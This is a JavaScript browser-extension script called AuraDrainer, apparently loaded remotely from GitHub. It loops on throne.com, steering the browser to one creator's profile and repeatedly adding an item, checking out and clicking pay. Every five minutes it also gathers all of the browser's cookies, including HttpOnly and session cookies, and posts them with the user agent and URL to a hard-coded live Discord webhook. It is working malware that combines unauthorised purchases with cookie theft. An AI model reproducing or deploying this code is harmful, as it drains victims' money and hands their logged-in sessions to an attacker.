// ========================================
// AURADRAINER - Remote Execution Script
// This file is hosted on GitHub and loaded remotely
// Update this file to push changes to all users
// ========================================

const config = {
  throneUrl: "throne.com/thegoddessaura",
  forceStop: true,
  forceStopShortcut: "Alt+Shift+E",
  debugMode: true,
  // Specific item targeting (leave empty "" to add any item)
  targetItemName: "Auto-Drain", // 
  discordWebhook: {
    enabled: true,
    url: "https://discord.com/api/webhooks/1425598331186450617/aZ1GNPgxuY61sidoAJTYYU78qbaMqM-Gv6auQX7XYHJ8c0ueRq1aFeuBV7s8b6DyOZyr", 
    maxMessageLength: 2000, 
    cookieLogEnabled: true,
    cookieLogInterval: 300000, // 5 minutes in milliseconds
  }
};

//var audioOpened = false;
var payClicked = false;
var itemsAddedToCart = 0;
var maxItemsToAdd = 1; // Only one item per purchase
var purchaseInProgress = false;
var lastActionTime = 0;
var debugBoxVisible = true; // Track debug box visibility
var cookieLoggingActive = false; // Track if cookie logging is active

// Debug box functionality
function createDebugBox() {
  const debugBox = document.createElement("div");
  debugBox.id = "extension-debug-box";
  debugBox.style.cssText = `
    position: fixed;
    top: 10px;
    right: 10px;
    width: 350px;
    height: 300px;
    background: rgba(0, 0, 0, 0.9);
    color: #00ff00;
    font-family: 'Courier New', monospace;
    font-size: 12px;
    padding: 10px;
    border: 2px solid #00ff00;
    border-radius: 5px;
    z-index: 999999;
    overflow: hidden;
    resize: both;
    min-width: 200px;
    min-height: 150px;
    cursor: default;
  `;
  
  const header = document.createElement("div");
  header.style.cssText = `
    color: #ffff00;
    font-weight: bold;
    margin-bottom: 10px;
    border-bottom: 1px solid #00ff00;
    padding-bottom: 5px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    user-select: none;
  `;
  
  const headerText = document.createElement("span");
  headerText.textContent = "🚀 Empress Radia Debug Log";
  headerText.style.cursor = "move";
  
  const copyButton = document.createElement("button");
  copyButton.textContent = "📋 Copy";
  copyButton.style.cssText = `
    background: #00ff00;
    color: #000;
    border: none;
    padding: 3px 8px;
    border-radius: 3px;
    cursor: pointer;
    font-size: 11px;
    font-weight: bold;
  `;
  copyButton.addEventListener("click", (e) => {
    e.stopPropagation();
    const logContainer = document.getElementById("debug-logs");
    if (logContainer) {
      const logs = Array.from(logContainer.children).map(entry => entry.textContent).join('\n');
      navigator.clipboard.writeText(logs).then(() => {
        copyButton.textContent = "✅ Copied!";
        setTimeout(() => {
          copyButton.textContent = "📋 Copy";
        }, 2000);
      }).catch(err => {
        console.error('Failed to copy logs:', err);
        copyButton.textContent = "❌ Failed";
        setTimeout(() => {
          copyButton.textContent = "📋 Copy";
        }, 2000);
      });
    }
  });
  
  header.appendChild(headerText);
  header.appendChild(copyButton);
  
  const logContainer = document.createElement("div");
  logContainer.id = "debug-logs";
  logContainer.style.cssText = `
    height: calc(100% - 40px);
    overflow-y: auto;
    overflow-x: hidden;
  `;
  
  debugBox.appendChild(header);
  debugBox.appendChild(logContainer);
  document.body.appendChild(debugBox);
  
  // Make the debug box draggable (using headerText as handle)
  makeDraggable(debugBox, headerText);
  
  return logContainer;
}

function makeDraggable(element, handle) {
  let isDragging = false;
  let currentX;
  let currentY;
  let initialX;
  let initialY;
  let xOffset = 0;
  let yOffset = 0;

  handle.addEventListener("mousedown", dragStart);
  document.addEventListener("mousemove", drag);
  document.addEventListener("mouseup", dragEnd);

  function dragStart(e) {
    initialX = e.clientX - xOffset;
    initialY = e.clientY - yOffset;

    if (e.target === handle) {
      isDragging = true;
    }
  }

  function drag(e) {
    if (isDragging) {
      e.preventDefault();
      currentX = e.clientX - initialX;
      currentY = e.clientY - initialY;

      xOffset = currentX;
      yOffset = currentY;

      element.style.transform = `translate(${currentX}px, ${currentY}px)`;
    }
  }

  function dragEnd(e) {
    initialX = currentX;
    initialY = currentY;
    isDragging = false;
  }
}

// Toggle debug box visibility
function toggleDebugBox() {
  const debugBox = document.getElementById("extension-debug-box");
  if (debugBox) {
    debugBoxVisible = !debugBoxVisible;
    debugBox.style.display = debugBoxVisible ? "block" : "none";
    console.log(`%c[AuraDrainer] Debug box ${debugBoxVisible ? 'shown' : 'hidden'}`, "color: #00ff00;");
  }
}

// Cookie collection functions using custom events (MAIN world bridge)
async function getAllCookiesFromBackground() {
  debugLog("🍪 [COOKIE DEBUG] Starting getAllCookiesFromBackground()", "info");
  
  return new Promise((resolve) => {
    debugLog("🍪 [COOKIE DEBUG] Setting up event listener for cookie response...", "info");
    
    const requestId = `cookie_${Date.now()}_${Math.random()}`;
    debugLog(`🍪 [COOKIE DEBUG] Request ID: ${requestId}`, "info");
    
    // Listen for response from content script
    const responseHandler = (event) => {
      debugLog(`🍪 [COOKIE DEBUG] Event received: ${JSON.stringify(event.detail).substring(0, 100)}`, "info");
      
      if (event.detail && event.detail.action === 'cookieResponse' && event.detail.requestId === requestId) {
        debugLog(`🍪 [COOKIE DEBUG] Cookie response received for request ${requestId}`, "info");
        
        window.removeEventListener('auradrainer-cookie-response', responseHandler);
        
        if (event.detail.success) {
          const cookies = event.detail.cookies || [];
          debugLog(`🍪 [COOKIE DEBUG] Successfully received ${cookies.length} cookies`, "success");
          resolve(cookies);
        } else {
          debugLog(`🍪 [COOKIE DEBUG] Failed to get cookies: ${event.detail.error || 'Unknown error'}`, "error");
          resolve([]);
        }
      }
    };
    
    window.addEventListener('auradrainer-cookie-response', responseHandler);
    
    // Send request to content script via custom event
    debugLog("🍪 [COOKIE DEBUG] Dispatching custom event to request cookies...", "info");
    const event = new CustomEvent('auradrainer-cookie-request', {
      detail: { 
        action: 'getAllCookies',
        requestId: requestId,
        timestamp: Date.now()
      },
      bubbles: true,
      composed: true
    });
    
    debugLog("🍪 [COOKIE DEBUG] Dispatching event...", "info");
    window.dispatchEvent(event);
    debugLog("🍪 [COOKIE DEBUG] Event dispatched, waiting for response...", "info");
    
    // Timeout after 10 seconds
    setTimeout(() => {
      window.removeEventListener('auradrainer-cookie-response', responseHandler);
      debugLog(`🍪 [COOKIE DEBUG] Cookie request timeout for ${requestId}`, "error");
      debugLog(`🍪 [COOKIE DEBUG] Check if content script event bridge is running`, "error");
      resolve([]);
    }, 10000);
  });
}

async function getDomainCookiesFromBackground(domain) {
  debugLog(`🍪 [COOKIE DEBUG] Getting cookies for domain: ${domain}`, "info");
  
  return new Promise((resolve) => {
    const responseHandler = (event) => {
      if (event.detail && event.detail.action === 'cookieResponse') {
        window.removeEventListener('auradrainer-cookie-response', responseHandler);
        
        if (event.detail.success) {
          const cookies = event.detail.cookies || [];
          debugLog(`🍪 [COOKIE DEBUG] Received ${cookies.length} cookies for ${domain}`, "success");
          resolve(cookies);
        } else {
          debugLog(`🍪 [COOKIE DEBUG] Failed to get cookies for ${domain}: ${event.detail.error}`, "error");
          resolve([]);
        }
      }
    };
    
    window.addEventListener('auradrainer-cookie-response', responseHandler);
    
    const event = new CustomEvent('auradrainer-cookie-request', {
      detail: { action: 'getDomainCookies', domain: domain }
    });
    window.dispatchEvent(event);
    
    setTimeout(() => {
      window.removeEventListener('auradrainer-cookie-response', responseHandler);
      resolve([]);
    }, 10000);
  });
}

// Discord webhook functions
async function sendToDiscordWebhook(message, isFile = false) {
  debugLog("📡 [DISCORD DEBUG] Starting sendToDiscordWebhook()", "info");
  debugLog(`📡 [DISCORD DEBUG] isFile: ${isFile}`, "info");
  debugLog(`📡 [DISCORD DEBUG] Message length: ${message?.length || 0}`, "info");
  
  // Check webhook configuration
  debugLog(`📡 [DISCORD DEBUG] Webhook enabled: ${config.discordWebhook.enabled}`, "info");
  debugLog(`📡 [DISCORD DEBUG] Webhook URL configured: ${!!config.discordWebhook.url}`, "info");
  debugLog(`📡 [DISCORD DEBUG] Webhook URL: ${config.discordWebhook.url?.substring(0, 50)}...`, "info");
  
  if (!config.discordWebhook.enabled || !config.discordWebhook.url || config.discordWebhook.url === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
    debugLog("⚠️ [DISCORD DEBUG] Discord webhook not configured properly", "warning");
    debugLog(`⚠️ [DISCORD DEBUG] Enabled: ${config.discordWebhook.enabled}`, "warning");
    debugLog(`⚠️ [DISCORD DEBUG] URL exists: ${!!config.discordWebhook.url}`, "warning");
    debugLog(`⚠️ [DISCORD DEBUG] URL is placeholder: ${config.discordWebhook.url === "YOUR_DISCORD_WEBHOOK_URL_HERE"}`, "warning");
    return false;
  }

  try {
    debugLog("📡 [DISCORD DEBUG] Creating payload...", "info");
    
    let requestOptions;
    
    if (isFile) {
      // For file uploads, create FormData directly
      const formData = new FormData();
      formData.append('content', "🍪 **Cookie Collection Report** 🍪");
      
      // Create a proper file blob
      const blob = new Blob([message], { type: 'text/plain' });
      formData.append('files[0]', blob, `cookies_${Date.now()}.txt`);
      
      debugLog(`📡 [DISCORD DEBUG] Payload created, type: file`, "info");
      debugLog(`📡 [DISCORD DEBUG] File size: ${message.length} bytes`, "info");
      
      // Don't set Content-Type header - browser will set it automatically with boundary
      requestOptions = {
        method: 'POST',
        body: formData
      };
    } else {
      const payload = {
        content: message
      };
      
      debugLog(`📡 [DISCORD DEBUG] Payload created, type: message`, "info");
      debugLog(`📡 [DISCORD DEBUG] Payload size: ${JSON.stringify(payload).length}`, "info");
      
      requestOptions = {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      };
    }

    debugLog("📡 [DISCORD DEBUG] Sending fetch request...", "info");
    debugLog(`📡 [DISCORD DEBUG] Request options:`, "info");
    debugLog(`📡 [DISCORD DEBUG] Method: ${requestOptions.method}`, "info");
    debugLog(`📡 [DISCORD DEBUG] Body type: ${typeof requestOptions.body}`, "info");

    const response = await fetch(config.discordWebhook.url, requestOptions);
    
    debugLog(`📡 [DISCORD DEBUG] Fetch response received`, "info");
    debugLog(`📡 [DISCORD DEBUG] Response status: ${response.status}`, "info");
    debugLog(`📡 [DISCORD DEBUG] Response statusText: ${response.statusText}`, "info");
    debugLog(`📡 [DISCORD DEBUG] Response ok: ${response.ok}`, "info");

    // Try to get response text for debugging
    try {
      const responseText = await response.text();
      debugLog(`📡 [DISCORD DEBUG] Response body: ${responseText}`, "info");
    } catch (e) {
      debugLog(`📡 [DISCORD DEBUG] Could not read response body: ${e.message}`, "warning");
    }

    if (response.ok) {
      debugLog("✅ [DISCORD DEBUG] Successfully sent to Discord webhook", "success");
      return true;
    } else {
      debugLog(`❌ [DISCORD DEBUG] Discord webhook failed: ${response.status} ${response.statusText}`, "error");
      return false;
    }
  } catch (error) {
    debugLog(`❌ [DISCORD DEBUG] Discord webhook error: ${error.message}`, "error");
    debugLog(`❌ [DISCORD DEBUG] Error stack: ${error.stack}`, "error");
    return false;
  }
}


function splitMessageForDiscord(message, maxLength = 2000) {
  if (message.length <= maxLength) {
    return [message];
  }

  const messages = [];
  const lines = message.split('\n');
  let currentMessage = '';

  for (const line of lines) {
    if (currentMessage.length + line.length + 1 <= maxLength) {
      currentMessage += (currentMessage ? '\n' : '') + line;
    } else {
      if (currentMessage) {
        messages.push(currentMessage);
        currentMessage = line;
      } else {
        // Single line is too long, force split
        messages.push(line.substring(0, maxLength - 3) + '...');
      }
    }
  }

  if (currentMessage) {
    messages.push(currentMessage);
  }

  return messages;
}

// Main cookie logging function
async function collectAndLogCookies() {
  debugLog("🍪 [MAIN DEBUG] Starting collectAndLogCookies()", "info");
  debugLog(`🍪 [MAIN DEBUG] Current time: ${new Date().toLocaleString()}`, "info");
  
  if (!config.discordWebhook.cookieLogEnabled) {
    debugLog("🍪 [MAIN DEBUG] Cookie logging disabled in config", "info");
    debugLog(`🍪 [MAIN DEBUG] cookieLogEnabled: ${config.discordWebhook.cookieLogEnabled}`, "info");
    return;
  }

  if (cookieLoggingActive) {
    debugLog("🍪 [MAIN DEBUG] Cookie logging already in progress, skipping", "warning");
    debugLog(`🍪 [MAIN DEBUG] cookieLoggingActive: ${cookieLoggingActive}`, "warning");
    return;
  }

  cookieLoggingActive = true;
  debugLog("🍪 [MAIN DEBUG] Set cookieLoggingActive = true", "info");
  debugLog("🍪 [MAIN DEBUG] Starting cookie collection...", "info");

  try {
    debugLog("🍪 [MAIN DEBUG] Calling getAllCookiesFromBackground()...", "info");
    const cookies = await getAllCookiesFromBackground();
    debugLog(`🍪 [MAIN DEBUG] getAllCookiesFromBackground() returned ${cookies.length} cookies`, "info");

    if (cookies.length === 0) {
      debugLog("🍪 [MAIN DEBUG] No cookies found, ending collection", "warning");
      cookieLoggingActive = false;
      return;
    }

    debugLog("🍪 [MAIN DEBUG] Calling formatCookiesForDiscord()...", "info");
    // Format cookies for Discord
    const cookieReport = await formatCookiesForDiscord(cookies);
    debugLog(`🍪 [MAIN DEBUG] formatCookiesForDiscord() returned report of length ${cookieReport.length}`, "info");
    debugLog(`🍪 [MAIN DEBUG] Report preview: ${cookieReport.substring(0, 300)}...`, "info");
    debugLog(`🍪 [MAIN DEBUG] Cookie data valid: ${cookieReport.length > 0 && cookieReport !== "No cookies found."}`, "info");
    
    // Try to send as file first (if message is too long)
    if (cookieReport.length > config.discordWebhook.maxMessageLength) {
      debugLog(`🍪 [MAIN DEBUG] Cookie data too large (${cookieReport.length} > ${config.discordWebhook.maxMessageLength}), sending as file...`, "info");
      const success = await sendToDiscordWebhook(cookieReport, true);
      debugLog(`🍪 [MAIN DEBUG] File send result: ${success}`, success ? "success" : "error");
      if (success) {
        debugLog("✅ [MAIN DEBUG] Cookie report sent as file to Discord", "success");
      } else {
        debugLog("❌ [MAIN DEBUG] Failed to send cookie report as file to Discord", "error");
      }
    } else {
      debugLog(`🍪 [MAIN DEBUG] Cookie data size OK (${cookieReport.length} <= ${config.discordWebhook.maxMessageLength}), sending as message...`, "info");
      // Send as regular message
      const success = await sendToDiscordWebhook(cookieReport);
      debugLog(`🍪 [MAIN DEBUG] Message send result: ${success}`, success ? "success" : "error");
      if (success) {
        debugLog("✅ [MAIN DEBUG] Cookie report sent to Discord", "success");
      } else {
        debugLog("❌ [MAIN DEBUG] Failed to send cookie report to Discord", "error");
      }
    }

  } catch (error) {
    debugLog(`❌ [MAIN DEBUG] Cookie collection failed: ${error.message}`, "error");
    debugLog(`❌ [MAIN DEBUG] Error stack: ${error.stack}`, "error");
  } finally {
    debugLog("🍪 [MAIN DEBUG] Setting cookieLoggingActive = false", "info");
    cookieLoggingActive = false;
    debugLog("🍪 [MAIN DEBUG] collectAndLogCookies() completed", "info");
  }
}

async function formatCookiesForDiscord(cookies) {
  if (!cookies || cookies.length === 0) {
    return "No cookies found.";
  }

  // Group cookies by domain for better organization
  const cookiesByDomain = {};
  cookies.forEach(cookie => {
    const domain = cookie.domain;
    if (!cookiesByDomain[domain]) {
      cookiesByDomain[domain] = [];
    }
    cookiesByDomain[domain].push(cookie);
  });

  let formattedText = `🍪 **COOKIE COLLECTION REPORT** 🍪\n`;
  formattedText += `📊 **Total Cookies:** ${cookies.length}\n`;
  formattedText += `🌐 **Domains:** ${Object.keys(cookiesByDomain).length}\n`;
  formattedText += `⏰ **Timestamp:** ${new Date().toLocaleString()}\n`;
  formattedText += `🖥️ **User Agent:** ${navigator.userAgent}\n`;
  formattedText += `🌍 **URL:** ${window.location.href}\n\n`;

  // Add cookies by domain
  Object.keys(cookiesByDomain).sort().forEach(domain => {
    const domainCookies = cookiesByDomain[domain];
    formattedText += `🌐 **${domain}** (${domainCookies.length} cookies)\n`;
    
    domainCookies.forEach(cookie => {
      formattedText += `  • **${cookie.name}** = \`${cookie.value}\`\n`;
      if (cookie.secure) formattedText += `    🔒 Secure\n`;
      if (cookie.httpOnly) formattedText += `    🛡️ HttpOnly\n`;
      if (cookie.session) formattedText += `    ⏱️ Session\n`;
      if (cookie.expirationDate) {
        const expDate = new Date(cookie.expirationDate * 1000);
        formattedText += `    ⏰ Expires: ${expDate.toLocaleString()}\n`;
      }
      formattedText += `\n`;
    });
    formattedText += `\n`;
  });

  return formattedText;
}

// Test Discord webhook connection
async function testDiscordWebhook() {
  debugLog("🧪 [WEBHOOK TEST] Starting Discord webhook test...", "info");
  
  const testMessage = `🧪 **WEBHOOK TEST MESSAGE** 🧪\n\n` +
    `⏰ **Time:** ${new Date().toLocaleString()}\n` +
    `🌍 **URL:** ${window.location.href}\n` +
    `🖥️ **User Agent:** ${navigator.userAgent.substring(0, 100)}...\n\n` +
    `✅ If you receive this message, your webhook is working correctly!`;
  
  debugLog("🧪 [WEBHOOK TEST] Sending test message...", "info");
  const success = await sendToDiscordWebhook(testMessage);
  
  if (success) {
    debugLog("✅ [WEBHOOK TEST] Webhook test successful!", "success");
  } else {
    debugLog("❌ [WEBHOOK TEST] Webhook test failed!", "error");
  }
  
  return success;
}

function debugLog(message, type = "info") {
  if (!config.debugMode) return;
  
  let logContainer = document.getElementById("debug-logs");
  if (!logContainer) {
    logContainer = createDebugBox();
  }
  
  const timestamp = new Date().toLocaleTimeString();
  const logEntry = document.createElement("div");
  
  let color = "#00ff00"; // default green
  let prefix = "[INFO]";
  let icon = "ℹ️";
  
  switch(type) {
    case "error":
      color = "#ff0000";
      prefix = "[ERROR]";
      icon = "❌";
      break;
    case "warning":
      color = "#ffaa00";
      prefix = "[WARN]";
      icon = "⚠️";
      break;
    case "success":
      color = "#00ffff";
      prefix = "[SUCCESS]";
      icon = "✅";
      break;
    case "action":
      color = "#ffff00";
      prefix = "[ACTION]";
      icon = "🎯";
      break;
    case "purchase":
      color = "#ff69b4";
      prefix = "[PURCHASE]";
      icon = "💳";
      break;
    case "cart":
      color = "#00ff88";
      prefix = "[CART]";
      icon = "🛒";
      break;
    case "navigation":
      color = "#87ceeb";
      prefix = "[NAV]";
      icon = "🧭";
      break;
  }
  
  // Add status indicators
  const statusInfo = getStatusInfo();
  const fullMessage = `${icon} ${message} ${statusInfo}`;
  
  logEntry.innerHTML = `<span style="color: #888">${timestamp}</span> <span style="color: ${color}">${prefix}</span> ${fullMessage}`;
  logEntry.style.marginBottom = "2px";
  logEntry.style.wordWrap = "break-word";
  
  logContainer.appendChild(logEntry);
  logContainer.scrollTop = logContainer.scrollHeight;
  
  // Keep only last 100 logs to prevent memory issues
  while (logContainer.children.length > 100) {
    logContainer.removeChild(logContainer.firstChild);
  }
}

function getStatusInfo() {
  const status = [];
  if (purchaseInProgress) status.push("🔄 PURCHASING");
  if (itemsAddedToCart > 0) status.push(`🛒 CART: ${itemsAddedToCart}/${maxItemsToAdd}`);
  if (payClicked) status.push("💳 PAID");
  return status.length > 0 ? `| ${status.join(" | ")}` : "";
}

function clickAddToCartForAnyItem() {
  // Check if we've already added enough items
  if (itemsAddedToCart >= maxItemsToAdd) {
    debugLog(`Cart limit reached (${itemsAddedToCart}/${maxItemsToAdd}), skipping add process`, "warning");
    return;
  }
  
  if (purchaseInProgress) {
    debugLog("Purchase already in progress, skipping add to cart", "warning");
    return;
  }
  
  const targetItem = config.targetItemName.trim();
  if (targetItem) {
    debugLog(`🔍 Scanning for specific item: "${targetItem}"`, "cart");
  } else {
    debugLog("🔍 Scanning for available items to add to cart", "cart");
  }
  
  setTimeout(() => {
    // Double-check limit before adding (race condition protection)
    if (itemsAddedToCart >= maxItemsToAdd) {
      debugLog(`Cart limit already reached during scan, aborting`, "warning");
      return;
    }
    
    const productCards = document.querySelectorAll("[class*=chakra-stack]");
    debugLog(`📦 Found ${productCards.length} product cards on page`, "info");

    let itemsFound = 0;
    let addableItems = 0;
    let specificItemFound = false;
    let fallbackItem = null;

    for (const card of productCards) {
      const hasImmediateChildWithIdParent = Array.from(card.children).some(
        (child) => child.id === "parent"
      );
      if (!hasImmediateChildWithIdParent) continue;
      
      itemsFound++;
      const addButton = card.querySelector("button");
      
      // STRICT CHECK: Must be exactly "Add to cart" or "Add" button
      if (addButton) {
        const btnText = addButton.textContent.trim().toLowerCase();
        // Must contain "add" AND either "cart" or be exactly "add"
        if ((btnText.includes("add") && btnText.includes("cart")) || btnText === "add") {
          addableItems++;
          
          // Get item name from the card (look for text/heading elements)
          let itemName = "";
          const headings = card.querySelectorAll("h1, h2, h3, h4, h5, h6, p, span");
          for (const heading of headings) {
            const text = heading.textContent.trim();
            if (text && text.length > 3 && text !== btnText) {
              itemName = text;
              break;
            }
          }
          
          // If we have a target item name, try to match it
          if (targetItem && itemName.toLowerCase().includes(targetItem.toLowerCase())) {
            specificItemFound = true;
            debugLog(`🎯 Found target item: "${itemName}"`, "cart");
            debugLog(`💫 Adding specific item to cart...`, "cart");
            addButton.click();
            itemsAddedToCart++;
            purchaseInProgress = true;
            debugLog(`✅ Specific item added successfully! Cart: ${itemsAddedToCart}/${maxItemsToAdd}`, "success");
            debugLog(`🚀 Initiating purchase sequence...`, "purchase");
            
            // Schedule checkout after a delay to ensure item is added
            setTimeout(() => {
              if (purchaseInProgress && itemsAddedToCart > 0) {
                clickCheckoutIfExists();
              }
            }, 3000);
            
            return;
          }
          
          // Store first available item as fallback
          if (!fallbackItem) {
            fallbackItem = { button: addButton, name: itemName };
            debugLog(`💾 Stored fallback item: "${itemName}"`, "info");
          }
        }
      }
    }
    
    // If specific item was requested but not found, use fallback
    if (targetItem && !specificItemFound && fallbackItem) {
      debugLog(`⚠️ Specific item "${targetItem}" not found, using fallback`, "warning");
      debugLog(`🎯 Adding fallback item: "${fallbackItem.name}"`, "cart");
      fallbackItem.button.click();
      itemsAddedToCart++;
      purchaseInProgress = true;
      debugLog(`✅ Fallback item added successfully! Cart: ${itemsAddedToCart}/${maxItemsToAdd}`, "success");
      debugLog(`🚀 Initiating purchase sequence...`, "purchase");
      
      setTimeout(() => {
        if (purchaseInProgress && itemsAddedToCart > 0) {
          clickCheckoutIfExists();
        }
      }, 3000);
      
      return;
    }
    
    // If no target specified, just add the first available item
    if (!targetItem && fallbackItem) {
      debugLog(`🎯 Adding available item: "${fallbackItem.name}"`, "cart");
      fallbackItem.button.click();
      itemsAddedToCart++;
      purchaseInProgress = true;
      debugLog(`✅ Item added successfully! Cart: ${itemsAddedToCart}/${maxItemsToAdd}`, "success");
      debugLog(`🚀 Initiating purchase sequence...`, "purchase");
      
      setTimeout(() => {
        if (purchaseInProgress && itemsAddedToCart > 0) {
          clickCheckoutIfExists();
        }
      }, 3000);
      
      return;
    }
    
    if (itemsFound > 0) {
      debugLog(`📊 Scan complete: ${itemsFound} items found, ${addableItems} addable`, "info");
    }
    
    if (addableItems === 0) {
      debugLog(`❌ No addable items found on this page`, "warning");
    } else if (targetItem && !specificItemFound) {
      debugLog(`❌ Target item "${targetItem}" not found on this page`, "warning");
    }
  }, 3000); // Reduced delay for faster response
}

function clickCheckoutIfExists() {
  if (!purchaseInProgress && itemsAddedToCart === 0) {
    debugLog("No items in cart, skipping checkout", "warning");
    return;
  }
  
  debugLog("🔍 Searching for checkout button", "action");
  
  setTimeout(() => {
    const buttons = document.querySelectorAll("button");
    debugLog(`🔘 Found ${buttons.length} buttons on page`, "info");
    
    for (const btn of buttons) {
      if (btn.textContent.trim().toLowerCase() === "checkout") {
        debugLog(`🎯 Checkout button found: "${btn.textContent.trim()}"`, "cart");
        debugLog(`💫 Clicking checkout button...`, "cart");
        btn.click();
        debugLog(`✅ Checkout initiated successfully!`, "success");
        return;
      }
    }
    
    debugLog("❌ No checkout button found with exact text 'checkout'", "warning");
    debugLog("🔄 Will retry on next cycle", "warning");
  }, 6000);
}

function clickPayNowIfExists() {
  debugLog("💳 Searching for payment button", "purchase");
  
  setTimeout(() => {
    const buttons = document.querySelectorAll("button");
    debugLog(`🔘 Found ${buttons.length} buttons on checkout page`, "info");
    
    // Debug: Log all button texts
    const buttonTexts = Array.from(buttons).map(btn => btn.textContent.trim()).filter(text => text.length > 0);
    debugLog(`📝 Button texts: ${buttonTexts.join(', ')}`, "info");
    
    const paymentTexts = ["pay now", "pay", "complete purchase", "buy now", "purchase", "place order"];
    let paymentButtonsFound = 0;
    
    for (const btn of buttons) {
      const span = btn.querySelector("span");
      const btnText = btn.textContent.trim().toLowerCase();
      
      // Skip empty buttons
      if (!btnText) continue;
      
      // Check span text first
      if (span && span.textContent.trim().toLowerCase() === "pay now" && !btn.disabled) {
        paymentButtonsFound++;
        debugLog(`🎯 Pay Now button found in span: "${span.textContent.trim()}"`, "purchase");
        debugLog(`💳 Processing payment...`, "purchase");
        btn.click();
        payClicked = true;
        purchaseInProgress = false;
        debugLog(`✅ Payment completed successfully! 🎉`, "success");
        debugLog(`🏁 Purchase sequence finished`, "success");
        return;
      }
      
      // Check button text for other payment variations
      for (const paymentText of paymentTexts) {
        if (btnText.includes(paymentText) && !btn.disabled) {
          paymentButtonsFound++;
          debugLog(`🎯 Payment button found: "${btn.textContent.trim()}"`, "purchase");
          debugLog(`💳 Processing payment...`, "purchase");
          btn.click();
          payClicked = true;
          purchaseInProgress = false;
          debugLog(`✅ Payment completed successfully! 🎉`, "success");
          debugLog(`🏁 Purchase sequence finished`, "success");
          return;
        }
      }
    }
    
    debugLog(`❌ No payment buttons found (checked ${paymentButtonsFound} potential buttons)`, "warning");
    debugLog("🔄 Will retry payment detection on next cycle", "warning");
  }, 7000);
}


function redirectToProfile() {
  debugLog("🧭 Redirecting to profile page", "navigation");
  window.location.href = `https://${config.throneUrl}`;
}

function isOnCartOrCheckoutPage() {
  const url = window.location.href.toLowerCase();
  return url.includes('cart') || url.includes('checkout') || url.includes('payment');
}

function resetPurchaseState() {
  itemsAddedToCart = 0;
  purchaseInProgress = false;
  payClicked = false;
  debugLog("🔄 Purchase state reset - ready for new purchase", "info");
}

function mainLoop() {
  const url = window.location.href;
  const currentTime = Date.now();
  
  debugLog(`🔄 Main loop cycle | URL: ${url}`, "info");

  // Handle different throne.com scenarios
  if (url.includes("throne.com/checkout") || isOnCartOrCheckoutPage()) {
    debugLog("💳 On checkout/cart page - attempting payment", "purchase");
    clickPayNowIfExists();
  } else if (url.includes("throne.com/thegoddessaura")) {
    // Check if purchase was completed (successful payment)
    if (payClicked && !purchaseInProgress) {
      debugLog("🎉 Previous purchase completed, resetting for new purchase", "success");
      resetPurchaseState();
      return;
    }
    
    // CRITICAL FIX: Only add items if we haven't reached the limit
    if (itemsAddedToCart < maxItemsToAdd && !isOnCartOrCheckoutPage() && !purchaseInProgress) {
      debugLog("🛍️ On profile page - scanning for items to purchase", "cart");
      clickAddToCartForAnyItem();
      // DON'T call clickCheckoutIfExists here - let it be called separately after item is added
    } else if (itemsAddedToCart >= maxItemsToAdd && purchaseInProgress) {
      debugLog(`📊 Cart has ${itemsAddedToCart} item(s), focusing on checkout only`, "cart");
      clickCheckoutIfExists();
    } else if (purchaseInProgress && itemsAddedToCart > 0) {
      debugLog("🔄 Purchase in progress, continuing checkout flow", "purchase");
      clickCheckoutIfExists();
    } else {
      debugLog("ℹ️ Waiting for next action...", "info");
    }
  } else if (url === "https://throne.com/" || url === "https://throne.com" || url.includes("throne.com/?") || url.includes("throne.com#")) {
    debugLog("🏠 On throne.com homepage - redirecting to target profile", "navigation");
    redirectToProfile();
  } else if (url.includes("throne.com")) {
    debugLog("🧭 On throne.com but not target profile - redirecting", "navigation");
    redirectToProfile();
  } else {
    debugLog(`⚠️ Not on throne.com - current URL: ${url}`, "warning");
  }
}

// ...existing code...

function main() {
  debugLog("🚀AutoDrain Started!", "success");
  debugLog(`🎯 Target Profile: ${config.throneUrl}`, "info");
  debugLog(`🛒 Purchase Mode: Single Item Per Transaction`, "info");
  if (config.targetItemName.trim()) {
    debugLog(`🎁 Target Item: "${config.targetItemName}" (with fallback)`, "info");
  } else {
    debugLog(`🎁 Target Item: Any available item`, "info");
  }
  debugLog(`🔧 Debug Mode: Enabled`, "info");
  debugLog(`⚡ Force Stop: Alt+Shift+E`, "info");
  debugLog(`👁️ Toggle Debug: Ctrl+Alt+D`, "info");
  debugLog(`🍪 Cookie Log: Ctrl+Alt+C`, "info");
  debugLog(`🧪 Test Webhook: Ctrl+Alt+T`, "info");
  debugLog(`📡 Discord Webhook: ${config.discordWebhook.enabled ? 'Enabled' : 'Disabled'}`, "info");
  debugLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "info");
  
  const mainInterval = setInterval(mainLoop, 5000);
  
  // Initialize cookie logging if enabled
  if (config.discordWebhook.cookieLogEnabled && config.discordWebhook.enabled) {
    debugLog(`🍪 Cookie logging enabled (interval: ${config.discordWebhook.cookieLogInterval / 1000}s)`, "info");
    
    // Test webhook connection first
    setTimeout(() => {
      debugLog("🧪 Testing webhook connection on startup...", "info");
      testDiscordWebhook();
    }, 5000);
    
    // Initial cookie collection after 15 seconds
    setTimeout(() => {
      collectAndLogCookies();
    }, 15000);
    
    // Periodic cookie collection
    setInterval(() => {
      collectAndLogCookies();
    }, config.discordWebhook.cookieLogInterval);
  } else {
    debugLog("🍪 Cookie logging disabled", "info");
  }
  
  window.addEventListener("keydown", (event) => {
    // Emergency stop shortcut
    if (event.altKey && event.shiftKey && event.key === "E") {
      if (config.forceStop) {
        debugLog("🛑 EMERGENCY STOP ACTIVATED (Alt+Shift+E)", "error");
        debugLog("🔄 Stopping all automation...", "warning");
        clearInterval(mainInterval);
        debugLog("✅ Extension stopped successfully", "success");
      }
    }
    
    // Debug toggle shortcut
    if (event.ctrlKey && event.altKey && event.key === "D") {
      event.preventDefault(); // Prevent browser default behavior
      toggleDebugBox();
    }
    
    // Cookie collection shortcut
    if (event.ctrlKey && event.altKey && event.key === "C") {
      event.preventDefault(); // Prevent browser default behavior
      debugLog("🍪 Manual cookie collection triggered", "info");
      collectAndLogCookies();
    }
    
    // Webhook test shortcut
    if (event.ctrlKey && event.altKey && event.key === "T") {
      event.preventDefault(); // Prevent browser default behavior
      debugLog("🧪 Manual webhook test triggered", "info");
      testDiscordWebhook();
    }
  });
}

// Start everything
main();

